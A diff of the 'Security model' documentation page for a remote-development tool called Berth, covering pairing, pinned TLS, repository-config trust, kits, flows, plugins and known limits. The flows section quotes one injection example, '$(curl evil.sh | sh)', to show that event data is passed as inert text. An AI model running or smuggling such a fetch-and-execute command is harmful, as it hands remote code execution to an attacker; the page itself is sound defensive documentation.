@@ -1,11 +1,29 @@
 ---
 title: Security model
-description: Identity, pinned mutual TLS, pairing, where berthd listens, and what is still open.
+description: Who Berth trusts and for what, how laptops and boxes prove who they are, what guards repository config, kits, flows and plugins, and what is still open.
 ---
 
 Every connection in Berth is between two keys that have met before. Nothing
 on a box is reachable without a paired laptop, and nothing is public unless
-someone shares it.
+someone shares it. Inside that, Berth runs other people's code and data (a
+repository's config, a kit, a plugin, a pull request's comments), and asks
+before any of it runs.
+
+## Who is trusted with what
+
+| Who | What they can do | What guards it |
+| --- | --- | --- |
+| A **paired laptop** | Everything the box's user can: start shells and agents, run commands, change config, upgrade berthd | Pairing (one code, used once), pinned keys, `berthd revoke` |
+| **Anything running as the box's user** (agents, scripts, hooks) | The same, through berthd's socket and `~/.berth` | Nothing beyond the operating system: it is you on that box |
+| Someone who can **commit to a repository** on a box | Nothing, until you trust its `.berth/config.json` on that box | [Repository trust](#repository-config), per content hash |
+| A **kit's** author | Nothing, until you apply the kit you reviewed | [Kit review](#kits), pinned to a hash |
+| A **plugin's** author | Everything the app can, once you allow the plugin | [Plugin consent](#plugins), pinned to a hash |
+| Whoever writes **event data** (a PR title, a review comment, a branch name, an agent's output) | Text in your flows, never commands | [How flows fill in values](#flows-and-event-data) |
+| Someone with a box's **phone token** | Read agents' screens and type into sessions on that box, from your tailnet | [The phone](#the-phone) |
+| The **network** | Nothing: it sees encrypted traffic between pinned keys | [Identity and transport](#identity-and-transport) |
+
+Pair only laptops you own, and only trust repositories, kits and plugins
+whose authors you would let run commands as you.
 
 ## Identity and transport
 
@@ -36,14 +54,44 @@ whatever the reason. A trust store that cannot be read authorizes nobody.
 
 The [install script](/getting-started/add-a-box#with-the-install-command)
 runs on the box itself and ends with step 1, so the laptop needs no SSH at
-all. It checks the berthd it downloads against the release's `checksums.txt`
-before running it. `berth add ssh HOST` does all of this over one SSH
-session instead: it detects the box's platform, uploads the matching berthd,
-installs the service, and pairs.
+all. `berth add ssh HOST` does all of this over one SSH session instead: it
+detects the box's platform, uploads the matching berthd, installs the
+service, and pairs. It checks box and network names before they reach an SSH
+command line, and a host key is trusted without asking only when you pass
+its fingerprint (`--trust-host-key`), which **Set up** in the app does for a
+tailnet machine whose key Tailscale reports.
 
 On the box, `berthd clients` lists paired laptops and
 `berthd revoke <name|fingerprint>` stops trusting one. On the laptop,
 `berth forget BOX` removes a box.
+
+### Inviting another computer
+
+A paired laptop can ask a box for a pairing code for another computer of the
+same person (`berth invite`, Settings → Computers). The box issues it over
+the laptop's own pinned connection, exactly as `berthd pair` would: one
+code, single use, ten minutes, consumed under the same lock and proven the
+same way (step 3), so the code still never crosses the network from the new
+computer. Asking runs the `before:pairing.invite` gate, is limited to ten
+codes per ten minutes per box, and announces `pairing.invited` with who asked,
+never the code; no box or laptop logs a code.
+
+The laptop bundles one code per box into a join link with each box's
+addresses and fingerprint, which the new computer pins. It holds no key of
+the inviting laptop and no token. Whoever holds the link before it expires
+can pair with those boxes, so the app and CLI ask before making one and say
+so; see [more than one computer](/guides/more-computers). A link whose
+fingerprint was changed reaches no box (the handshake fails before any
+proof), and a used or expired code is refused like any other.
+
+## Revoking a laptop
+
+`berthd revoke` removes a laptop's key, and the running daemon closes the
+shells, port streams and event streams it still had open: at once when
+`berthd revoke` runs on the box, otherwise within a second or two. Another
+paired laptop can do the same from Settings → Computers (`DELETE
+/v1/clients/{name}`, gated by `before:client.revoke`), which closes them at
+once; a laptop cannot remove itself that way.
 
 ## Where berthd listens
 
@@ -61,47 +109,61 @@ one-time browser sign-in). Each paired box records the network it is reached
 through; pairing, the agent's connections and `add ssh` all dial through it.
 Berth's own pinned TLS still runs on top: the tailnet only provides the route.
 
-## Local URLs
+## On the laptop
 
-Every port on a box is reachable at `http://<port>.<box>.localhost:1377/`.
-All operating systems resolve `*.localhost` to loopback, so no DNS is
-involved. The proxy presents requests to the app as `localhost:<port>` and
-rewrites the app's own redirects back, so dev servers need no configuration.
-Unknown hosts are refused, which blocks DNS rebinding. Fixed-port forwards
-listen on both loopback addresses and refuse a port another program already
-holds on `::1`, where `localhost` resolves first on macOS.
-
-The app's API on `127.0.0.1:1378` takes a bearer token from a file only your
-user can read, checks the `Host` header, and allows only the app's own
-origins; see [the app's API](/reference/app-api#transport).
+- **Private URLs.** Every port on a box is reachable at
+  `http://<port>.<box>.localhost:1377/`. All operating systems resolve
+  `*.localhost` to loopback, so no DNS is involved. The proxy presents
+  requests to the app as `localhost:<port>` and rewrites the app's own
+  redirects back, so dev servers need no configuration. Unknown hosts are
+  refused, which blocks DNS rebinding. Fixed-port forwards listen on both
+  loopback addresses and refuse a port another program already holds on
+  `::1`, where `localhost` resolves first on macOS.
+- **The app's API** on `127.0.0.1:1378` takes a bearer token from a file
+  only your user can read, checks the `Host` header, and allows only the
+  app's own origins. The token travels in a header; only WebSocket upgrades,
+  which a browser can't give headers, may carry it in the query string. See
+  [the app's API](/reference/app-api#transport).
+- **What the app runs.** The packaged app starts the laptop agent only from
+  the `berth` it carries (`Contents/MacOS/berth-cli`), and only while that is
+  signed by the same Developer ID team as the app: never one on `PATH`, in
+  `~/.local/bin` or named by `BERTH_CLI`, where anything running as you could
+  plant one. Only a dev build looks elsewhere. The same goes for
+  [Use this Mac](/getting-started/add-a-box#this-mac): the agent installs only
+  the app's own `Contents/Resources/berthd`, checked against the app's team
+  before it is copied out, and the copy is checked again
+  (`codesign --verify`) before launchd runs it. That box listens on
+  `127.0.0.1` only.
+- **SSH config.** `berth ssh-config --write` writes a host per box for
+  editors. The SSH user a box reports is checked against a strict pattern
+  first, so a box can't add lines of its own to your SSH config.
 
 ## Public shares
 
 Sharing is opt-in, one port at a time (`berth share BOX PORT`). The **box**
 runs a Cloudflare quick tunnel, so a link survives the laptop sleeping.
 Shares end when revoked or when berthd stops or upgrades; none outlive the
-daemon that manages them.
-Agents' [skills](/guides/agent-integrations#skills) tell them never to share
-a port unless a person asked.
+daemon that manages them. Agents' [skills](/guides/agent-integrations#skills)
+tell them never to share a port unless a person asked.
 
-## Upgrades
+## Releases and upgrades
 
-`berth upgrade BOX` uploads the matching daemon over Berth's own connection.
-The box runs the upload once and requires it to report the box's own
-fingerprint, swaps it in, and re-executes in place, keeping its PID so the
-supervisor sees no restart and sessions are untouched. Public shares stop
-first.
-
-## Secrets and prompts
-
-- A project's environment can name secrets (`op://…` for 1Password,
-  `env://…` for a variable in berthd's own environment) instead of holding
-  them. The box reads them when needed and never writes a value to disk, a
-  log, an event or the API; see [secrets](/guides/secrets).
-- Prompts never appear in events or logs: `session.sent` carries only the
-  session's name, and agent tool hooks forward only identifiers and paths.
-- The offline queue keeps prompts on the laptop, in its state directory, and
-  never puts them in an event.
+- **The Mac app** is signed with a Developer ID and notarized by Apple.
+  [Its updates](/getting-started/install#updates) come from the latest GitHub
+  release, over HTTPS, and are installed only if they carry a valid
+  signature from Berth's updater key, whose public half is built into the
+  app. Nothing installs until you choose **Restart to update**.
+- **berthd and the CLI** from a release are checked against the release's
+  `checksums.txt` by the install script. That catches a broken or truncated
+  download, but the checksums come from the same release, so they don't
+  prove who made it (see [known limits](#known-limits)).
+- **`berth upgrade BOX`** uploads the matching daemon over Berth's own
+  connection. The box runs the upload once to check it starts and reads the
+  box's own identity, swaps it in, and re-executes in place, keeping its PID
+  so the supervisor sees no restart and sessions are untouched. Public shares
+  stop first. The check catches a wrong build, not a malicious one: any
+  paired laptop can replace berthd, as it can run any command there. A
+  `before:box.upgrade` gate sees each upgrade.
 
 ## Repository config
 
@@ -111,9 +173,75 @@ can commit to a repository could otherwise run them on every box that has
 it. So a box runs none of that until someone trusts the file on that box,
 for that project, and only the exact bytes they saw (its SHA-256 hash): any
 change to the file waits to be trusted again. Until then only its port count
-applies, and the app shows what it wants to run. A kit you apply and the
-box's own config are yours and need no trust. See
+applies, and the app shows what it wants to run (**This repository wants to
+run …**). From a terminal, `berth location config BOX/LOC` shows it and its
+hash, and `--trust HASH` or `--untrust` decide. A kit you apply and the box's
+own config are yours and need no trust. See
 [trusting a repository's config](/guides/project-config#trusting-a-repositorys-config).
+
+## Kits
+
+A [kit](/guides/kits) runs its scripts on the boxes you apply it to, so
+nothing in one runs until you have seen it:
+
+- Adding a kit shows everything it does and every file it carries, with a
+  hash of all of it. What is kept is exactly what you saw: the link is
+  fetched again when you confirm, and refused if it now hashes differently.
+- Applying is a separate step, and applying from the review goes ahead only
+  while the kept copy still has the hash you reviewed.
+- On a box, a kit's files are written only inside its own folder, and
+  `before:kit.install` and `before:kit.remove` gates can refuse them.
+
+## Flows and event data
+
+[Flows](/guides/automations) run on events whose data can come from someone
+else: a pull request's title, a review comment, a branch name, an agent's
+output. That data is only ever text:
+
+- A `run` step's command never contains a value. Each variable is in the
+  command's environment as `$BERTH_FLOW_…`, and `{{event.body}}` in a
+  command becomes a quoted reference to it, so a comment of
+  `$(curl evil.sh | sh)` is passed as those characters.
+- Values in a webhook's URL are percent-encoded, and values in its body
+  JSON-escaped, so a value can't add a host, a path, a parameter or a field.
+- A secret's value never leaves in a webhook, a notification or a step's
+  kept output: it shows as `[secret]`.
+- Webhooks and [phone notifications](/guides/phone) reach only public
+  addresses (notifications also your tailnet). Loopback, private, link-local,
+  cloud metadata and other reserved addresses are refused, checked on the
+  address actually dialled, redirects included, unless the box's owner
+  allows them in `~/.berth/network.json` on the box, which nothing in the
+  API or a repository can change. See
+  [outbound requests](/guides/automations#outbound-requests).
+
+## Git and files on the box
+
+- Cloning a repository and fetching a kit allow only git's `https`, `http`,
+  `ssh` and `git` transports, so a link can't use `file://` to read a local
+  repository or `ext::` to run a command. (A kit can still come from a
+  folder on your laptop, which is copied, not cloned.)
+- Installing Berth's [skills](/guides/agent-integrations#skills) into a
+  repository refuses to follow symbolic links, so a repository can't
+  redirect the write to a file elsewhere on the box.
+
+## Secrets and prompts
+
+- A project's environment can name secrets (`op://…` for 1Password,
+  `env://…` for a variable in berthd's own environment) instead of holding
+  them. Values are read when needed and kept in memory: sessions and
+  services read theirs inside their own process (`berthd secret exec`), so
+  a value is never on a command line. No value is written to disk, a log, an
+  event or the API; see [secrets](/guides/secrets#how-values-are-handled).
+- A prompt typed into a session (`berth session send`, a flow's `prompt`
+  step, the phone) never appears in events or logs: `session.sent` carries
+  only the session's name, and agent tool hooks forward only identifiers
+  and paths.
+- A **first** prompt is different: `berth task new --prompt` and a flow's
+  `start_agent` put it on the agent's command line, so it is part of the
+  session's command, which `session.started`, `before:session.start` and the
+  sessions list carry (see [known limits](#known-limits)).
+- The offline queue keeps prompts on the laptop, in its state directory, and
+  never puts them in an event.
 
 ## The phone
 
@@ -125,10 +253,14 @@ with a token per box. Its threat model is on [the phone page](/guides/phone#thre
 `before:` hooks on a box can refuse actions (creating worktrees, starting
 sessions, sending prompts, running `exec`, installing kits, changing config,
 replacing the hooks themselves), whoever asks: the app, the CLI, a flow, an
-agent or the phone. Every route that changes something runs one. A gate
-scoped to a `tool` lets that tool's own actions through only when it calls
-from the box itself; a paired laptop or the phone claiming to be the tool is
-still gated. See [hooks](/guides/hooks#gates).
+agent or the phone. Every API route that changes something runs one; see
+[the list](/reference/events#gates).
+
+A gate sees an origin the box can vouch for. A paired laptop is
+`laptop:<name>` and the phone is `remote`, whatever origin they claim; only
+a caller on the box's own socket names its tool. So a gate scoped to a
+`tool` lets that tool's own actions through only when the tool runs on the
+box. See [hooks](/guides/hooks#gates).
 
 Gates are a convenience, not a security boundary: they keep agents and
 automations inside the lines you draw, but a paired laptop can already run
@@ -137,23 +269,45 @@ commands on the box, and anything running as the box's user can edit
 
 ## Plugins
 
-Desktop plugins run inside the app with its full access. See
-[plugins](/guides/plugins#trust-and-consent) for the consent prompt and what
-a plugin you allow can do.
+Desktop plugins run inside the app with its full access: its API token,
+every paired box, and the network. So a plugin you install never turns on by
+itself. The first time, the app shows what it can do and a hash of its code,
+and runs it only once you allow it; when its code changes, it is off until
+you allow it again. On a box, a plugin's hooks run only once the plugin is
+listed in the box's `~/.berth/plugins.json`. See
+[trust and consent](/guides/plugins#trust-and-consent).
 
-## Revoking a laptop
+## Known limits
 
-`berthd revoke` removes a laptop's key, and the running daemon closes the
-shells, port streams and event streams it still had open: at once when
-`berthd revoke` runs on the box, otherwise within a second or two.
-
-## Open questions
-
-- An independent review of the pairing protocol and the pre-authentication
-  surface before teammates rely on it.
-- Handshake flooding: pairing is rate limited, TLS handshakes are not.
-- Team sharing: one box used by several people, and how access is granted and
-  revoked beyond per-laptop pairing.
-- Windows, and dropping the proxy port with a privileged helper.
+- **Plugins are not sandboxed.** Consent decides whether a plugin runs, not
+  what it can do once it runs. Running each plugin in an isolated view with
+  only the capabilities it asks for is planned.
+- **Gate origins on the box are claimed, not proven.** A caller on berthd's
+  own socket names its own origin (`--origin`, `BERTH_ORIGIN`), so anything
+  running as the box's user can pass a gate scoped to a tool. That is the
+  same user who can edit the hooks.
+- **First prompts and plain environment values are on command lines.** A
+  first prompt is in the agent's command (`$SHELL -lc "claude '…'"`), and
+  the project's plain `env` values are passed to tmux as `-e KEY=VALUE`, so
+  other processes on the box can see them, for instance with `ps`. Secret
+  references (`op://`, `env://`) are not: they are resolved inside the
+  session. Keep anything sensitive in a secret reference.
+- **Release archives are not signed.** `checksums.txt` proves a download is
+  intact, not who published it, and `berth upgrade` trusts the laptop that
+  sends the binary. Signed checksums and signed daemon upgrades are planned.
+- **The tailnet address is found by its range.** berthd listens on the first
+  address in `100.64.0.0/10`, Tailscale's range. On a network that also uses
+  that range for carrier-grade NAT, check where it listens with
+  `berthd doctor`.
+- **`*.localhost` cookies are shared.** A dev server that sets a cookie for
+  `localhost` itself makes it visible to every other private URL in your
+  browser, across worktrees and boxes.
+- **Handshake flooding.** Pairing is rate limited; TLS handshakes are not.
+- **Not yet reviewed independently.** The pairing protocol and the surface
+  before authentication should have an outside review before teammates rely
+  on them.
+- **One person per box.** Team sharing (one box used by several people, and
+  granting and revoking their access beyond per-laptop pairing), Windows,
+  and dropping the proxy port with a privileged helper are open.
 
 Ready to pair? [Add a box](/getting-started/add-a-box).
